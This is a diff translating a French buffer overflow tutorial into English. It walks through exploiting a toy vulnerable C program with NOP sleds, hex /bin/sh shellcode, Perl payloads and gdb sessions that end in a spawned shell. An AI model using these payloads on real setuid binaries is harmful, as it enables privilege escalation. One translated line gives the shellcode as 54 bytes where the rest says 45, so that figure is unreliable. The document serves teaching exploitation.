+The NOPs will therefore be between `0xbffffc00` and `0xbffffc00 + 31 = 0xbffffc1f`. To make sure that we will fall into, let's take the address `0xbffffc10`.
 
-Finalement, nous allons envoyer :
+Finally, we will send :
 
   * 31 x NOP
   * Shellcode
   * 0xbffffc10
 
-Nous ponvous écrire cela en Perl de la manière suivante (en n'oubliant pas, pour l'adresse, la notation Little Endian)
+We can write this in Perl in the following way (for the address, don't forget the Little Endian notation).
 
 ```perl
 print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"
 ```
 
-En le lançant dans gdb, on obtient alors le résultat suivant :
+By running it in gdb, we get the following result :
 
 ```bash
 (gdb) run `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
@@ -473,16 +471,16 @@ Starting program: /tmp/hackndo/binary `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\
                                              ̀1ۉ�@̀�����/bin/sh���
 process 20353 is executing new program: /bin/dash
 
-$ 
+$
 ```
 
-Voilà, nous avons utilisé la vulnérabilité pour ouvrir un shell. Si le binaire est suid, ce shell aura les droits du propriétaire du binaire lorsque la vulnérabilité sera exploitée hors gdb.
+Here we go, we used the vulnerability to open a shell. If the binary is suid, this shell will have the rights of the binary owner when the vulnerability is exploited outside gdb.
 
-Vous avez suivi jusque là ? Bien joué !
+Did you follow it all the way here? Good job!
 
 * * *
 
-### Cas 2
+### Case 2
 
 ```c
 #include <stdio.h>
@@ -504,9 +502,9 @@ int main(int argc, char *argv[])
 }
 ```
 
-Ce programme est presque similaire au programme précédant, cependant cette fois-ci la taille allouée au buffer n'est que de 8 octets. A cause de cela, l'espace n'est plus suffisant pour pouvoir y injecter notre shellcode.
+This program is almost similar to the previous one, however this time the size allocated to the buffer is 8 bytes only. Because of this, there is not enough space to inject our shellcode into it.
 
-Pour en être sûr, étudions le nouveau code assembleur associé à ce programme
+To be sure, let's take a look at the assembly code of this program :
 
 ```bash
 (gdb) disass main
@@ -524,7 +522,7 @@ Dump of assembler code for function main:
    0x08048439 <+32>:    add    eax,0x4
    0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
    0x0804843e <+37>:    mov    DWORD PTR [esp],eax
-   0x08048441 <+40>:    call   0x80483f4 
+   0x08048441 <+40>:    call   0x80483f4
    0x08048446 <+45>:    mov    eax,0x0
    0x0804844b <+50>:    leave
    0x0804844c <+51>:    ret
@@ -549,15 +547,15 @@ End of assembler dump.
 (gdb)
 ```
 
-C'est exactement le même que celui du cas 1, sauf que cette fois-ci, dans le code assembleur de `func`, on remarque que l'espace réellement alloué pour notre buffer est de `0x10` (16) octets. Notre shellcode étant composé de 45 octets, nous ne pourrons pas l'injecter ici.
+It's exactly the same as case 1, except that this time, in the `func` assembly code, we notice that the actual space allocated for our buffer is `0x10` (16) bytes. Since our shellcode is 54 bytes long, we won't be able to inject it here.
 
-Le plus simple est alors de faire exactement la même démarche que pour le premier cas, sauf que nous injecterons notre shellcode **après** la sauvegarde de EIP, comme le montre le schéma suivant :
+The simplest thing to do then is to do exactly the same thing as in the first case, except that this time we will inject our shellcode **after** the save of EIP, as shown in the following figure :
 
 [![img_54f78478da290](/assets/uploads/2015/03/img_54f78478da290.png)](/assets/uploads/2015/03/img_54f78478da290.png)
 
-Le pool de `NOP` (`\x9`0) n'est là que pour 'assurer' le coup, il n'est pas nécessaire. Viser une plage de 200 `NOP` est plus simple que viser l'adresse exacte de début de shellcode. Cependant, nous allons tout de même le faire sans, sinon ça serait trop simple !
+The `NOP` (`\x90`) pool is only here to make it easier, it is not necessary. Aiming for a range of 200 `NOP` is easier than aiming for the exact start address of the shellcode. However, we are still going to do it without, otherwise it would be too simple !
 
-Les premières étapes du cas 1 sont toujours valables. Refaisons notre petit calcul. On voit dans les instructions assembleur que 0x10 octets (donc 16) sont réservés pour le buffer pour `strcpy`. Si nous ajoutons la taille de `EBP`, cela fait 20 octets. On peut vérifier ce calcul simplement en envoyant une chaine de 22 caractères, et en vérifiant que `EIP` a été écrasé à moitié :
+The first steps of case 1 are still valid. Let's do our little math again. We can see in the assembly instructions that 0x10 bytes (so 16) are allocated for the buffer for `strcpy`. If we add the size of `EBP`, that makes 20 bytes. We can verify this calculation simply by sending a 22 characters long string, and checking that `EIP` as been overwritten halfway :
 
 ```bash
 (gdb) run `perl -e 'print "A"x22'`
@@ -569,16 +567,16 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
 
-Nous voyons que le programme a tenté d'accéder à l'adresse mémoire 0x08004141. Donc les deux derniers caractères de notre chaine dépassent sur la sauvegarde de `EIP`. Il y a donc deux caractères en trop, ce qui fait bien 20 octets avant d'écraser `EIP` (sans compter le caractère null). Il faut donc pour notre payload :
+We can see that the program tried to access the memory address 0x08004141. So the last two characters of our string overflow on the `EIP` save. So there are two characters overflowing, which makes 20 bytes before overwriting `EIP` as we planned (not counting the null byte). So for our payload we need :
 
-  * 20 caractères (quels qu'ils soient)
-  * L'adresse qui suit l'adresse à laquelle est sauvegardée EIP
-  * (Le pool de NOP, mais nous allons faire sans)
-  * Le shellcode
+  * 20 characters (no matter which ones)
+  * The address following the one at which EIP is saved
+  * (The NOP pool, but we'll do without)
+  * The shellcode
 
 [![img_54f78d2d9a419](/assets/uploads/2015/03/img_54f78d2d9a419.png)](/assets/uploads/2015/03/img_54f78d2d9a419.png)
 
-Pour connaitre l'adresse de la sauvegarde de `EIP` (et donc l'adresse qui suit), faisons un breakpoint juste après que `EIP` est poussé sur la pile, c'est à dire à la première instruction de `func` et regardons la valeur de `ESP`.
+To find out the address of the `EIP` save (and thus the address that follows), let's put a breakpoint right after that `EIP` is pushed on the stack, i.e. at the first `func` instruction and look at the value of `ESP`.
 
 ```bash
 (gdb) break *0x080483f4
@@ -599,23 +597,23 @@ esp            0xbffffc4c    0xbffffc4c
 (gdb)
 ```
 
-_Mais pourquoi lancer `run` avec 69 `"A"`, plutôt que de lancer `run` sans argument ?_
+_But why run `run` whith 69 `"A"`, instead of running `run` without any argument ?_
 
-Il est important de se poser cette question. En effet, nous sommes en train de chercher une adresse précise d'une variable sur la pile. Il est important de passer 69 `"A"` en argument car c'est la longueur totale de notre payload que nous enverrons pour exploiter le buffer overflow (20 octets contenant le buffer et `EBP + 4` octets pour l'écrasement de `EIP + 45` octets de shellcode).  Or, avant la pile se trouvent les variables d'environnement et les arguments du programme (dont son nom).
+It is important to ask ourselves this question. Indeed, we are looking for a precise address of a variable on the stack. It is important de pass 69 `"A"` as argument because it is the total length of our payload that we will send to exploit the buffer overflow (20 bytes containing the buffer and `EBP + 4` bytes for overwriting `EIP + 45` bytes of shellcode ). Now, before the stack are the environment variables and program arguments (including the program name).
 
 [![img_54f81318e37b8](/assets/uploads/2015/03/img_54f81318e37b8.png)](/assets/uploads/2015/03/img_54f81318e37b8.png)
 
-Donc si on modifie la taille des arguments passés au programme, ça décalera la pile, donc les adresses que l'on recherche. C'est pourquoi il est indispensable de rester dans le même contexte d'exécution, en envoyant un argument qui soit toujours de la même taille, que ce soit pendant nos recherches ou pendant notre exploitation.
+So if we modify the size of the arguments passed to the program, it will shift the stack, so the addresses we are looking for. This is why it is essential to stay in the same execution context, by sending an argument that is always the same size, either during our research or during our exploitation.
 
-Cela étant dit, revenons au résultat de notre breakpoint : `ESP` a pour valeur `0xbffffc4c`, et on vérifie bien qu'à cette adresse se trouve `0x08048446`, qui est la valeur sauvegardée de `EIP` (puisque c'est l'adresse de l'instruction qui suit le `call` de `func`). Il va donc falloir faire pointer cette sauvegarde de `EIP` vers l'adresse suivante, qui contiendra notre shellcode, c'est à dire l'adresse `0xbffffc50`.
+That being said, let's go back to the result of our breakpoint : `ESP` has the value `0xbffffc4c`, and we check that at this address is `0x08048446`, which is the saved value of `EIP` (since it is the instruction address following the `call` of `func`). So we'll have to point this `EIP` backup to the following address, which will contain our shellcode, i.e. the address `0xbffffc50`.
 
-Nous avons donc notre payload, qui , en perl, est de la forme :
+So we have our payload, which, in perl, looks like this :
 
 ```perl
 print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
 ```
 
-Donc dans gdb, quand on envoie :
+So in gdb, we type :
 
 ```bash
 (gdb) run `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
@@ -626,13 +624,13 @@ AAAAAAAAAAAAAAAAAAAAP����^�1�F�F
                                  ���V
                                       ̀1ۉ�@̀�����/bin/sh
 process 21429 is executing new program: /bin/dash
-$ 
+$
 ```
 
-Voilà, nous avons également ouvert un shell avec le binaire en exploitant le buffer overflow.
+There we go, we also manage to pop a shell with the binary by exploiting a buffer overflow.
 
-J'ai également enregistré une vidéo avec une exploitation de buffer overflow comme dans le cas 1, vous la [trouverez ici](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}.
+I also made a video with a buffer overflow exploitation as in case 1, we can [find it here](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}. (The video is in french)
 
-J'espère que cet article **tuto buffer overflow** vous aura été utile. Des protections contre ce type d'exploitation existent cependant, comme le fait de rendre la pile non exécutable. À ce moment là, pas de panique, vous pouvez toujours récupérer un shell, avec par exemple la technique du [retour à la libc](/retour-a-la-libc/). Have fun !
+I hope this article **buffer overflow tutorial** has been helpful. However, there are some protections against this type of exploitation, such as making the stack non-executable. At this point, no panic, you can still get a shell, with, for example, the [return to libc](/retour-a-la-libc/) technique. Have fun !
 
-N'hésitez pas à commenter et partager si vous avez aimé !
+Feel free to comment and share if you liked it!
